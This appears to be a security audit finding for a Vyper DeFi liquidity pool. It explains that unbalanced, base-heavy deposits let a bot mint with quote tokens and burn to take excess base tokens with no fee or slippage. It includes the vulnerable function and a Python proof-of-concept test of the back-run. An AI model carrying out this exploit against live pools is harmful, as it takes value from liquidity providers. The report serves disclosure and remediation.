# unbalanced deposits with more base tokens than quote tokens can be back-run at the expense of LPs

## Summary

The protocol allows for deposits of base tokens and quote tokens with any ratio of base tokens to quote tokens. If an LP deposits a larger amount of base tokens than quote tokens, the way the system calculates the amounts of tokens to return at burn allows for a bot to deposit a large amount of quote tokens to back-run the unbalanced deposit and swap base tokens with zero fees and zero slippage at the expense of LPs.

The bot just needs another market to profit from a no fee/zero slippage opportunity for an arbitrage where they can sell the acquired base tokens at a profit. 

This can be done by anybody monitoring for unbalanced deposits, price differences in this system versus other markets to profit from this opportunity.

## Vulnerability Detail

When a user burns LP tokens the function `calc_burn` in the `Pools.vy` contract calculates the ratio of base to quote tokens to return to LP based on the state of the pools.

Within this function, the `balanced` function in the `Math.vy` contract calculates the amount of base and quote tokens to return to the LP based on the ratio of base tokens to quote tokens in the pool.

This function tries to keep the pools as balanced as possible based on the current state, but after
an unbalanced deposit of more base tokens than quote tokens, the function will skew the amount of base tokens to return to the LP to be higher than the amount of quote tokens to return to the LP.

def balanced(state: Value, burn_value: uint256, ctx: Ctx) -> Tokens:
  """
  Given the current state of the pool reserves, returns a mix of tokens
  of total value burn_value which improves pool balance (we consider a
  pool balanced when te value of base reserves equals quote reserves).
  Note that if we have an imbalanced pool (which is not necessarily
  a bad thing), this means that LPs mostly get back the tokens they
  put in.
  The preconditions (burn_value <= reserves) for this must be
  checked at the call site!
  """
  if state.have_more_base:
    if state.base_excess_as_quote >= burn_value:
     #####  this line here returns all excess base tokens and 0 quote tokens allowing the swap
      return Tokens({base: Math(self).quote_to_base(burn_value, ctx), quote: 0})
    else:
      base1: uint256 = state.base_excess_as_base
      left : uint256 = burn_value - state.base_excess_as_quote
      quote: uint256 = left / 2
      base2: uint256 = Math(self).quote_to_base(quote, ctx)
      base : uint256 = base1 + base2
      return Tokens({base: base, quote: quote})
  else:
    if state.quote_excess_as_quote >= burn_value:
      return Tokens({base: 0, quote: burn_value})
    else:
      quote1: uint256 = state.quote_excess_as_quote
      left  : uint256 = burn_value - quote1
      quote2: uint256 = left / 2
      base  : uint256 = Math(self).quote_to_base(quote2, ctx)
      quote : uint256 = quote1 + quote2
      return Tokens({base: base, quote: quote})
```

This calculation enables the bot to deposit a large amount of quote tokens and burn the LP after to essentially receive all the "excess" base tokens in the pool at the expense of LPs who deposited more base tokens than quote tokens essentially making a zero fee, zero slippage swap of base tokens for quote tokens.

## Impact

In this scenario the LP that makes an unbalanced deposit with more base tokens than quote tokens is unknowingly selling their base tokens for quote tokens at the spot price which may not be favorable to them in several cases, for example if the price of base token is experience volatility.

This could lead them to experience a higher level of impermanent loss than they would have if they had deposited an adjusted ratio of base tokens to quote tokens.

## Proof of Concept

The following test added to `test_core3.py` showcases the scenario, VEL is the base token and STX is the quote token. Assuming VEL is higher priced 10x than STX.

```python
def test_backrun_swap_base_tokens(
    setup,
    core,
    mint,
    burn,
    swapbot,  # add this account to conftest and mint and approve 1_000_000 STX for swapbot
    lp_provider,
    lp_provider2,
    lp_provider3,
    VEL,
    STX,
    LP,
):
    setup()
    # assumes no opened positions for simplicity
    # this can be pulled off with any unlocked reserves right after unbalanced deposits
    print("\nstarting balances of swapbot for VEL STX tokens")
    # swapbot starts with 1_000_000 STX and 0 VEL
    print("balance of lp_provider VEL", VEL.balanceOf(swapbot))
    print("balance of lp provider STX", STX.balanceOf(swapbot))

    print("\nbalances of lp_provider1 to start for VEL STX tokens")
    print("balance of lp_provider1 VEL", VEL.balanceOf(lp_provider))
    print("balance of lp_provider1 STX", STX.balanceOf(lp_provider))

    print("\nbalances of lp_provider2 to start for VEL STX tokens")
    print("balance of lp_provider2 VEL", VEL.balanceOf(lp_provider2))
    print("balance of lp_provider2 STX", STX.balanceOf(lp_provider2))

    print("\nbalances of lp_provider3 to start for VEL STX tokens")
    print("balance of lp_provider3 VEL", VEL.balanceOf(lp_provider3))
    print("balance of lp provider3 STX", STX.balanceOf(lp_provider3))

    # Mint for lp_provider1
    tx = mint(VEL, STX, LP, d(10_000), d(100_000), price=d(10), sender=lp_provider)
    logs = core.Mint.from_receipt(tx)
    amt = logs[0].lp_amt
    logger.info(amt)

    # Mint for lp_provider2
    tx = mint(VEL, STX, LP, d(10_000), d(100_000), price=d(10), sender=lp_provider2)
    logs = core.Mint.from_receipt(tx)
    amt = logs[0].lp_amt
    logger.info(amt)

    # Mint for lp_provider3 using imbalance deposit to create opportunity for swapbot
    tx = mint(VEL, STX, LP, d(100_000), d(100_000), price=d(10), sender=lp_provider3)
    logs = core.Mint.from_receipt(tx)
    amt = logs[0].lp_amt
    logger.info(amt)
    
    # swapbot starts mint and burn after the unbalanced deposit with only quote tokens
    tx = mint(VEL, STX, LP, d(0), d(1_000_000), price=d(10), sender=swapbot)
    logs = core.Mint.from_receipt(tx)
    amt = logs[0].lp_amt
    logger.info(amt)
    print("\ncurrent balances after mint swapbot")
    print("balance of swapbot VEL mint", VEL.balanceOf(swapbot))
    print("balance of swapbot STX mint", STX.balanceOf(swapbot))

    print("balance of core VEL mint", VEL.balanceOf(core))
    print("balance of core STX mint", STX.balanceOf(core))

    lp_balance = LP.balanceOf(swapbot)
    tx = burn(VEL, STX, LP, lp_balance, price=d(10), sender=swapbot)
    assert not tx.failed, "swapbot burn"
    logger.info(tx.decode_logs(core.Burn))
    print("\nfinal balances after burn swapbot")
    print("balance of swapbot VEL burn", VEL.balanceOf(swapbot))
    print("balance of lp swapbot STX burn", STX.balanceOf(swapbot))
    # final balances after burn swapbot
    # balance of swapbot VEL = 45000000000
    # balance of lp swapbot STX = 550000000000

    lp_balance = LP.balanceOf(lp_provider3)
    tx = burn(VEL, STX, LP, lp_balance, price=d(10), sender=lp_provider3)
    assert not tx.failed, "lp_provider3 burn"
    logger.info(tx.decode_logs(core.Burn))
    print("\nfinal balances of lp_provider3")
    print("balance of lp_provider3 VEL after", VEL.balanceOf(lp_provider3))
    print("balance of lp_provider3 STX after", STX.balanceOf(lp_provider3))
    # balance of lp_provider3 VEL after 55000000000 receives less VEL for equal STX
    # balance of lp_provider3 STX after 550000000000

    ## every other provider receives their exact ratio of deposit back unaffected
    lp_balance = LP.balanceOf(lp_provider)
    tx = burn(VEL, STX, LP, lp_balance, price=d(10), sender=lp_provider)
    assert not tx.failed, "lp_provider burn"
    logger.info(tx.decode_logs(core.Burn))
    print("\nfinal balances of lp_provider")
    print("balance of lp_provider VEL after", VEL.balanceOf(lp_provider))
    print("balance of lp_provider STX after", STX.balanceOf(lp_provider))

    lp_balance = LP.balanceOf(lp_provider2)
    tx = burn(VEL, STX, LP, lp_balance, price=d(10), sender=lp_provider2)
    assert not tx.failed, "lpprovider2 burn"
    logger.info(tx.decode_logs(core.Burn))
    print("\nfinal balances of lp_provider2")
    print("balance of lp_provider2 VEL after", VEL.balanceOf(lp_provider2))
    print("balance of lp_provider2 STX after", STX.balanceOf(lp_provider2))
```

## Tool used

Manual Review and Testing

## Recommendation

When LP is attempting to deposit a highly unbalanced amount of base tokens to quote tokens, the system may used a similar logic to the `balanced` function in the `Math.vy` contract to calculate the amount of base and quote tokens to return to the LP based on the ratio of base tokens to quote tokens in the pool to keep the pools as balanced as possible based on the current state.
